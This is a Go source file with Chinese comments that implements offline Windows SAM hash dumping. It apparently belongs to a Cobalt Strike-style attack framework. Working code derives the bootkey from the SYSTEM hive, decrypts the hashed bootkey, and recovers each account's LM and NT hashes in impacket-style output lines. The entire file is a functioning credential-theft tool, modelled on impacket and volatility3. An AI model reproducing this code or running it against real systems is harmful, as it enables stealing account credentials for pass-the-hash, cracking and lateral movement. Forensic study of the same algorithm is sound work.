// csdev :: hashdump.go  --  离线解析 SAM hive 取出 NTLM 哈希
//
// 完整链路: SYSTEM hive 派生 bootkey -> SAM 的 Account\F 派生 hbootkey
//          -> 每个用户的 V 值解出 LM/NT 哈希。
//
// 算法出处 (公开实现, 逐条对照, 未凭记忆编写):
//   volatility3  volatility3/framework/plugins/windows/registry/hashdump.py
//   impacket     impacket/examples/secretsdump.py (SAMHashes)
// 两个实现的约定一致: bootkey permute 表 / LSA 四个键的类名 / hbootkey 的
// rev2(RC4) 与 rev3(AES) 形态 / V 值的偏移表 / DES 密钥由 RID 展开。
//
// 形态覆盖:
//   hbootkey  rev2 = MD5(salt‖AQWERTY‖bootkey‖ANUM) 作 RC4 密钥, 解 F[0x80:0xA0]
//             rev3 = AES128-CBC(bootkey, iv=F[0x78:0x88], F[0x88:0xA8])
//   用户哈希  rev1 = RC4(MD5(hbootkey‖LE32(rid)‖LM|NTPASSWORD), blob[+4:+20])
//             rev2 = AES128-CBC(hbootkey, salt=blob[+4:+20], blob[+20:+52])
//             (注意 NT 的 rev2 salt 偏移是 +8/+24, 与 LM 的 +4/+20 不同 ——
//              vol3 与 impacket 都是这么写的, 抄二手实现时最容易在这里错)
//   obfkey 再用 RID 派生的两个 DES 密钥 ECB 解密, 拼成 16 字节哈希。
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	rc4c "crypto/rc4" // 别名: 同包的 server.go 已有一个 v1 时期的 rc4() 函数
	"encoding/binary"
	"fmt"
	"os"
	"sort"
	"strings"
)

// 空口令的哨兵值 (与 impacket/vol3 输出一致)
const (
	emptyLMHash = "aad3b435b51404eeaad3b435b51404ee"
	emptyNTHash = "31d6cfe0d16ae931b73c59d7e0c089c0"
)

// bootKeyPerm 是 bootkey 的置换表 (Windows 存放 LSA 类名的乱序约定)
var bootKeyPerm = [16]byte{0x08, 0x05, 0x04, 0x02, 0x0B, 0x09, 0x0D, 0x03,
	0x00, 0x06, 0x01, 0x0C, 0x0E, 0x0A, 0x0F, 0x07}

// hbootkey / 用户哈希派生的常量 (结尾的 NUL 是算法的一部分, 不能省)
var (
	aqwerty     = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
	anum        = []byte("0123456789012345678901234567890123456789\x00")
	ntPassword  = []byte("NTPASSWORD\x00")
	lmPassword  = []byte("LMPASSWORD\x00")
	bootKeyLDAP = []string{"JD", "Skew1", "GBG", "Data"}
)

// oddParity 把字节映射到最近的奇校验值 (镜像 vol3 的同名表)
var oddParity = [256]byte{
	1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
	16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
	32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
	49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
	64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
	81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
	97, 97, 98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110,
	112, 112, 115, 115, 117, 117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127,
	128, 128, 131, 131, 133, 133, 134, 134, 137, 137, 138, 138, 140, 140, 143, 143,
	145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155, 155, 157, 157, 158, 158,
	161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173, 174, 174,
	176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191,
	193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206,
	208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223,
	224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239,
	241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254,
}

// SamHash 是一条解析结果
type SamHash struct {
	User string
	RID  uint32
	LM   string
	NT   string
	// LMReal / NTReal 为假表示该字段是哨兵值, 而不是解密出来的哈希。
	// 常见情形: 现代 Windows 已禁用 LM, 账户的 LM 块是长度 24 的标记
	// (实测内置账户连 NT 块也是 24 字节) —— 此时按 impacket/vol3 的约定
	// 输出哨兵值, 但调用方需要知道"这是标记值"而不是"口令为空"。
	LMReal bool
	NTReal bool
	// Note 非空表示解析过程中确实出了异常 (偏移越界 / 解密失败),
	// 与"Windows 标记此处没有哈希"是两回事, 不能混为一谈。
	Note string
}

// Line 输出 CS / impacket 风格的一行
func (s SamHash) Line() string {
	return fmt.Sprintf("%s:%d:%s:%s:::", s.User, s.RID, s.LM, s.NT)
}

// HasRealHash 报告这条记录里是否至少有一个真实解出的哈希
func (s SamHash) HasRealHash() bool { return s.LMReal || s.NTReal }

// UserHash 是一次 V 值解析的结果 (纯函数返回, 便于单测)
type UserHash struct {
	LM     string
	NT     string
	LMReal bool
	NTReal bool
	// Note 记录解析异常 (不是"无哈希标记"); 无异常时为空
	Note string
}

// ---------------------------------------------------------------- bootkey

// applyBootKeyPerm 对 16 字节原始类名做置换。单独抽出来是为了可单测。
func applyBootKeyPerm(raw []byte) ([]byte, error) {
	if len(raw) != 16 {
		return nil, fmt.Errorf("bootkey 原始长度应为 16, 实得 %d", len(raw))
	}
	out := make([]byte, 16)
	for i, p := range bootKeyPerm {
		out[i] = raw[p]
	}
	return out, nil
}

// findControlSet 定位 SYSTEM hive 里当前生效的 ControlSet。
// 不能只试 CurrentControlSet: `reg save` 出的 hive 里它是符号链接,
// 真正带 LSA 子键的是 ControlSet00N (由 SYSTEM\Select\Current 指定)。
func findControlSet(root *RegKey) (*RegKey, error) {
	// 1) 按 Select\Current 指定的编号找
	if sel, err := root.SubKey("Select"); err == nil {
		if v, err := sel.Value("Current"); err == nil && len(v.Data) >= 4 {
			n := binary.LittleEndian.Uint32(v.Data[:4])
			if k, err := root.SubKey(fmt.Sprintf("ControlSet%03d", n)); err == nil {
				return k, nil
			}
		}
	}
	// 2) 直接试 CurrentControlSet (某些导出里它是实键)
	if k, err := root.SubKey("CurrentControlSet"); err == nil {
		return k, nil
	}
	// 3) 兜底: 扫 ControlSet001..010
	for i := 1; i <= 10; i++ {
		if k, err := root.SubKey(fmt.Sprintf("ControlSet%03d", i)); err == nil {
			return k, nil
		}
	}
	return nil, fmt.Errorf("SYSTEM hive 里找不到 ControlSet (CurrentControlSet / ControlSet001)")
}

// DeriveBootKey 从 SYSTEM hive 派生 bootkey。
//
// 做法: Lsa 下 JD/Skew1/GBG/Data 四个键的**类名**各是一段十六进制字符串,
// 按 JD+Skew1+GBG+Data 顺序拼成 32 个 hex 字符 = 16 字节, 再按置换表重排。
func DeriveBootKey(sys *Hive) ([]byte, error) {
	root, err := sys.Root()
	if err != nil {
		return nil, fmt.Errorf("读取 SYSTEM 根键失败: %w", err)
	}
	cs, err := findControlSet(root)
	if err != nil {
		return nil, err
	}
	control, err := cs.SubKey("Control")
	if err != nil {
		return nil, fmt.Errorf("%s 下缺少 Control 子键: %w", cs.Name, err)
	}
	lsa, err := control.SubKey("Lsa")
	if err != nil {
		return nil, fmt.Errorf("Control 下缺少 Lsa 子键: %w", err)
	}

	var hexStr strings.Builder
	for _, n := range bootKeyLDAP {
		sub, err := lsa.SubKey(n)
		if err != nil {
			return nil, fmt.Errorf("Lsa 下缺少子键 %s (hive 不完整或非本机导出)", n)
		}
		cn := sub.ClassName()
		if cn == "" {
			return nil, fmt.Errorf("Lsa\\%s 的类名为空 (bootkey 无法派生)", n)
		}
		hexStr.WriteString(cn)
	}

	raw, err := hexDecodeString(hexStr.String())
	if err != nil {
		return nil, fmt.Errorf("Lsa 类名不是合法十六进制 (%q): %w", hexStr.String(), err)
	}
	return applyBootKeyPerm(raw)
}

// ---------------------------------------------------------------- hbootkey

// DeriveHashedBootKey 用 bootkey 解出 SAM\Domains\Account 的 F 值里的 hbootkey
func DeriveHashedBootKey(sam *Hive, bootKey []byte) ([]byte, error) {
	if len(bootKey) != 16 {
		return nil, fmt.Errorf("bootkey 长度应为 16, 实得 %d", len(bootKey))
	}
	root, err := sam.Root()
	if err != nil {
		return nil, fmt.Errorf("读取 SAM 根键失败: %w", err)
	}
	samKey, err := root.SubKey("SAM")
	if err != nil {
		return nil, fmt.Errorf("SAM hive 缺少 SAM 子键")
	}
	domains, err := samKey.SubKey("Domains")
	if err != nil {
		return nil, fmt.Errorf("SAM\\SAM 缺少 Domains 子键")
	}
	account, err := domains.SubKey("Account")
	if err != nil {
		return nil, fmt.Errorf("SAM\\SAM\\Domains 缺少 Account 子键")
	}
	fv, err := account.Value("F")
	if err != nil {
		return nil, fmt.Errorf("Account 键缺少 F 值")
	}
	return DeriveHashedBootKeyFromF(fv.Data, bootKey)
}

// DeriveHashedBootKeyFromF 是 hbootkey 派生的纯函数形态 (便于单测)
func DeriveHashedBootKeyFromF(f []byte, bootKey []byte) ([]byte, error) {
	if len(f) < 0xA8 {
		return nil, fmt.Errorf("F 值过短: %d 字节", len(f))
	}
	if len(bootKey) != 16 {
		return nil, fmt.Errorf("bootkey 长度应为 16, 实得 %d", len(bootKey))
	}
	switch f[0x00] {
	case 2:
		// RC4: rc4_key = MD5(F[0x70:0x80] ‖ AQWERTY ‖ bootkey ‖ ANUM)
		m := md5.New()
		m.Write(f[0x70:0x80])
		m.Write(aqwerty)
		m.Write(bootKey)
		m.Write(anum)
		key := m.Sum(nil)
		out := make([]byte, len(f[0x80:0xA0]))
		c, err := rc4c.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("RC4 初始化失败: %w", err)
		}
		c.XORKeyStream(out, f[0x80:0xA0])
		return out[:16], nil
	case 3:
		// AES-128-CBC: iv = F[0x78:0x88], 密文 = F[0x88:0xA8]
		out, err := aesCBCDecrypt(bootKey, f[0x78:0x88], f[0x88:0xA8])
		if err != nil {
			return nil, fmt.Errorf("hbootkey AES 解密失败: %w", err)
		}
		if len(out) < 16 {
			return nil, fmt.Errorf("hbootkey AES 输出过短")
		}
		return out[:16], nil
	default:
		return nil, fmt.Errorf("不支持的 SAM F 结构版本 %d (仅支持 2=RC4 / 3=AES)", f[0x00])
	}
}

// ---------------------------------------------------------------- 用户哈希

// DumpHashes 解析 SAM hive 里所有用户的哈希
func DumpHashes(sam *Hive, hbootKey []byte) ([]SamHash, error) {
	if len(hbootKey) < 16 {
		return nil, fmt.Errorf("hbootkey 长度不足 16")
	}
	root, err := sam.Root()
	if err != nil {
		return nil, err
	}
	account, err := root.SubKey("SAM")
	if err != nil {
		return nil, fmt.Errorf("SAM hive 缺少 SAM 子键")
	}
	if account, err = account.SubKey("Domains"); err != nil {
		return nil, err
	}
	if account, err = account.SubKey("Account"); err != nil {
		return nil, err
	}
	users, err := account.SubKey("Users")
	if err != nil {
		return nil, fmt.Errorf("Account 下缺少 Users 子键")
	}
	subs, err := users.SubKeys()
	if err != nil {
		return nil, fmt.Errorf("枚举 Users 子键失败: %w", err)
	}

	out := []SamHash{}
	for _, u := range subs {
		// Names 是"用户名 -> RID"的索引键, 不是用户
		if strings.EqualFold(u.Name, "Names") {
			continue
		}
		rid, err := parseRIDHex(u.Name)
		if err != nil {
			continue
		}
		v, err := u.Value("V")
		if err != nil || len(v.Data) == 0 {
			continue
		}
		uh, err := DecryptUserHashes(v.Data, hbootKey, rid)
		if err != nil {
			// 单个用户解析失败不影响其它用户
			uh = UserHash{LM: emptyLMHash, NT: emptyNTHash, Note: err.Error()}
		}
		name := usernameFromV(v.Data)
		if name == "" {
			name = fmt.Sprintf("RID-%d", rid)
		}
		out = append(out, SamHash{User: name, RID: rid, LM: uh.LM, NT: uh.NT,
			LMReal: uh.LMReal, NTReal: uh.NTReal, Note: uh.Note})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].RID < out[j].RID })
	return out, nil
}

// DecryptUserHashes 从一个用户的 V 值解出 (LM, NT) 哈希。
// 找不到可用哈希块时按 vol3/impacket 的约定回哨兵值, 并把 Placeholder 置位。
func DecryptUserHashes(v []byte, hbootKey []byte, rid uint32) (UserHash, error) {
	var r UserHash
	if len(hbootKey) < 16 {
		return r, fmt.Errorf("hbootkey 长度不足 16")
	}
	// 偏移表至少要到 0xB0, 加上基址 0xCC 才能取到哈希块
	if len(v) < 0xB0 {
		return r, fmt.Errorf("V 值过短: %d 字节", len(v))
	}

	lmOff := int(binary.LittleEndian.Uint32(v[0x9C:0xA0])) + 0xCC
	lmLen := int(binary.LittleEndian.Uint32(v[0xA0:0xA4]))
	ntOff := int(binary.LittleEndian.Uint32(v[0xA8:0xAC])) + 0xCC
	ntLen := int(binary.LittleEndian.Uint32(v[0xAC:0xB0]))

	lmB, lmOK, errL := decryptOneHash(v, hbootKey, rid, lmOff, lmLen, lmPassword, false)
	ntB, ntOK, errN := decryptOneHash(v, hbootKey, rid, ntOff, ntLen, ntPassword, true)

	// 两个块都是真错误 (越界/解密失败) 才向上报错; 单纯"这里没有哈希"不算错误
	if errL != nil && errN != nil {
		return r, fmt.Errorf("LM 与 NT 均解密失败: %v / %v", errL, errN)
	}

	r.LM = orEmpty(lmB, emptyLMHash)
	r.NT = orEmpty(ntB, emptyNTHash)
	r.LMReal = lmOK
	r.NTReal = ntOK

	// 只有真异常才写 Note。Windows 用长度 24 的块标记"此处没有哈希",
	// 那是正常形态, 不是异常 —— 混在一起会让运维误判 hive 损坏。
	notes := []string{}
	if errL != nil {
		notes = append(notes, "LM: "+errL.Error())
	}
	if errN != nil {
		notes = append(notes, "NT: "+errN.Error())
	}
	r.Note = strings.Join(notes, "; ")
	return r, nil
}

func orEmpty(b []byte, empty string) string {
	if len(b) == 0 {
		return empty
	}
	return hexEncode(b)
}

// decryptOneHash 解单个 LM 或 NT 哈希块。
// isNT 决定 rev2 的 salt/密文偏移: 这两个偏移在 LM 与 NT 上并不相同
// (LM 是 +4/+20, NT 是 +8/+24), 是整条链路上最容易抄错的一处。
// ok=false 表示该块不是算法支持的形态 (不是错误, 是"这里没有哈希")。
func decryptOneHash(v, hbootKey []byte, rid uint32, off, length int, lmnt []byte, isNT bool) ([]byte, bool, error) {
	if off <= 0 || off+3 > len(v) {
		return nil, false, fmt.Errorf("哈希块偏移越界 (off=%d)", off)
	}
	rev := v[off+2]

	var obfKey []byte
	switch rev {
	case 1:
		if length != 20 {
			return nil, false, nil
		}
		if off+20 > len(v) {
			return nil, false, fmt.Errorf("rev1 数据越界")
		}
		enc := v[off+4 : off+20]
		m := md5.New()
		m.Write(hbootKey[:16])
		var rb [4]byte
		binary.LittleEndian.PutUint32(rb[:], rid)
		m.Write(rb[:])
		m.Write(lmnt)
		c, err := rc4c.NewCipher(m.Sum(nil))
		if err != nil {
			return nil, false, err
		}
		plain := make([]byte, len(enc))
		c.XORKeyStream(plain, enc)
		obfKey = plain

	case 2:
		if length != 56 {
			return nil, false, nil
		}
		// NT 的 salt/密文在 +8/+24, LM 在 +4/+20 (vol3 get_user_hashes 同此)
		saltOff, encOff := off+4, off+20
		if isNT {
			saltOff, encOff = off+8, off+24
		}
		if encOff+32 > len(v) {
			return nil, false, fmt.Errorf("rev2 数据越界")
		}
		salt := v[saltOff : saltOff+16]
		enc := v[encOff : encOff+32]
		out, err := aesCBCDecrypt(hbootKey[:16], salt, enc)
		if err != nil {
			return nil, false, fmt.Errorf("rev2 AES 解密失败: %w", err)
		}
		obfKey = out

	default:
		// rev 0 / 其它: Windows 用它标记"此处没有哈希" (实测内置账户是 len=24 rev=2)
		return nil, false, nil
	}

	if len(obfKey) < 16 {
		return nil, false, fmt.Errorf("obfkey 长度不足 16")
	}

	k1, k2 := sidToKeys(rid)
	d1, err := des.NewCipher(k1)
	if err != nil {
		return nil, false, fmt.Errorf("DES 密钥 1 非法: %w", err)
	}
	d2, err := des.NewCipher(k2)
	if err != nil {
		return nil, false, fmt.Errorf("DES 密钥 2 非法: %w", err)
	}
	out := make([]byte, 16)
	d1.Decrypt(out[0:8], obfKey[0:8])
	d2.Decrypt(out[8:16], obfKey[8:16])
	return out, true, nil
}

// usernameFromV 从 V 值取用户名 (UTF-16LE)
func usernameFromV(v []byte) string {
	if len(v) < 0x14 {
		return ""
	}
	off := int(binary.LittleEndian.Uint32(v[0x0C:0x10])) + 0xCC
	n := int(binary.LittleEndian.Uint32(v[0x10:0x14]))
	if n <= 0 || n > 512 || off < 0 || off+n > len(v) {
		return ""
	}
	return decodeUTF16LE(v[off : off+n])
}

// ---------------------------------------------------------------- DES 密钥

// sidToKeys 由 RID 展开出两个 DES 密钥 (vol3 sid_to_key / impacket __sid_to_key)
func sidToKeys(rid uint32) ([]byte, []byte) {
	base := [4]byte{byte(rid), byte(rid >> 8), byte(rid >> 16), byte(rid >> 24)}
	b1 := make([]byte, 0, 7)
	b1 = append(b1, base[0], base[1], base[2], base[3], base[0], base[1], base[2])
	b2 := make([]byte, 0, 7)
	b2 = append(b2, base[3], base[0], base[1], base[2], base[3], base[0], base[1])
	return sidBytesToKey(b1), sidBytesToKey(b2)
}

// sidBytesToKey 把 7 字节展开成 8 字节 DES 密钥并做奇校验
func sidBytesToKey(s []byte) []byte {
	if len(s) < 7 {
		return make([]byte, 8)
	}
	key := []byte{
		s[0] >> 1,
		((s[0] & 0x01) << 6) | (s[1] >> 2),
		((s[1] & 0x03) << 5) | (s[2] >> 3),
		((s[2] & 0x07) << 4) | (s[3] >> 4),
		((s[3] & 0x0F) << 3) | (s[4] >> 5),
		((s[4] & 0x1F) << 2) | (s[5] >> 6),
		((s[5] & 0x3F) << 1) | (s[6] >> 7),
		s[6] & 0x7F,
	}
	for i := range key {
		key[i] = oddParity[key[i]<<1]
	}
	return key
}

// ---------------------------------------------------------------- 顶层入口

// DumpSAMHashes 从两个 hive 的字节流直接产出哈希列表
func DumpSAMHashes(samHive, sysHive []byte) ([]SamHash, error) {
	sam, err := ParseHive(samHive)
	if err != nil {
		return nil, fmt.Errorf("解析 SAM hive 失败: %w", err)
	}
	sys, err := ParseHive(sysHive)
	if err != nil {
		return nil, fmt.Errorf("解析 SYSTEM hive 失败: %w", err)
	}
	boot, err := DeriveBootKey(sys)
	if err != nil {
		return nil, fmt.Errorf("派生 bootkey 失败: %w", err)
	}
	hb, err := DeriveHashedBootKey(sam, boot)
	if err != nil {
		return nil, fmt.Errorf("派生 hbootkey 失败: %w", err)
	}
	out, err := DumpHashes(sam, hb)
	if err != nil {
		return nil, fmt.Errorf("解析用户哈希失败: %w", err)
	}
	return out, nil
}

// DumpSAMHashFiles 从两个 hive 文件路径产出哈希列表
func DumpSAMHashFiles(samPath, sysPath string) ([]SamHash, error) {
	samB, err := os.ReadFile(samPath)
	if err != nil {
		return nil, fmt.Errorf("读取 SAM hive 失败: %w", err)
	}
	sysB, err := os.ReadFile(sysPath)
	if err != nil {
		return nil, fmt.Errorf("读取 SYSTEM hive 失败: %w", err)
	}
	return DumpSAMHashes(samB, sysB)
}

// ---------------------------------------------------------------- 小工具

// hexDecodeString 只接受十六进制字符 (类名里可能混入 NUL 之类的填充)
func hexDecodeString(s string) ([]byte, error) {
	clean := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= '0' && c <= '9', c >= 'a' && c <= 'f', c >= 'A' && c <= 'F':
			clean = append(clean, c)
		case c == 0:
			// 忽略填充
		default:
			return nil, fmt.Errorf("非法字符 %q", string(c))
		}
	}
	if len(clean)%2 != 0 {
		return nil, fmt.Errorf("十六进制长度为奇数: %d", len(clean))
	}
	out := make([]byte, len(clean)/2)
	for i := 0; i < len(out); i++ {
		hi := hexVal(clean[i*2])
		lo := hexVal(clean[i*2+1])
		out[i] = hi<<4 | lo
	}
	return out, nil
}

func hexVal(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	default:
		return c - 'A' + 10
	}
}

func hexEncode(b []byte) string {
	const tbl = "0123456789abcdef"
	out := make([]byte, len(b)*2)
	for i, v := range b {
		out[i*2] = tbl[v>>4]
		out[i*2+1] = tbl[v&0x0F]
	}
	return string(out)
}

// aesCBCDecrypt 无填充 AES-CBC 解密 (数据长度必须是 16 的倍数)
func aesCBCDecrypt(key, iv, data []byte) ([]byte, error) {
	if len(key) != 16 {
		return nil, fmt.Errorf("AES 密钥长度应为 16, 实得 %d", len(key))
	}
	if len(iv) != 16 {
		return nil, fmt.Errorf("IV 长度应为 16, 实得 %d", len(iv))
	}
	if len(data) == 0 || len(data)%16 != 0 {
		return nil, fmt.Errorf("密文长度必须是 16 的倍数, 实得 %d", len(data))
	}
	blk, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	out := make([]byte, len(data))
	cipher.NewCBCDecrypter(blk, iv).CryptBlocks(out, data)
	return out, nil
}

// parseRIDHex 解析用户键名 (8 位十六进制 RID)
func parseRIDHex(s string) (uint32, error) {
	if len(s) == 0 || len(s) > 8 {
		return 0, fmt.Errorf("非法 RID 键名 %q", s)
	}
	var v uint32
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= '0' && c <= '9':
			v = v<<4 | uint32(c-'0')
		case c >= 'a' && c <= 'f':
			v = v<<4 | uint32(c-'a'+10)
		case c >= 'A' && c <= 'F':
			v = v<<4 | uint32(c-'A'+10)
		default:
			return 0, fmt.Errorf("非法 RID 键名 %q", s)
		}
	}
	return v, nil
}
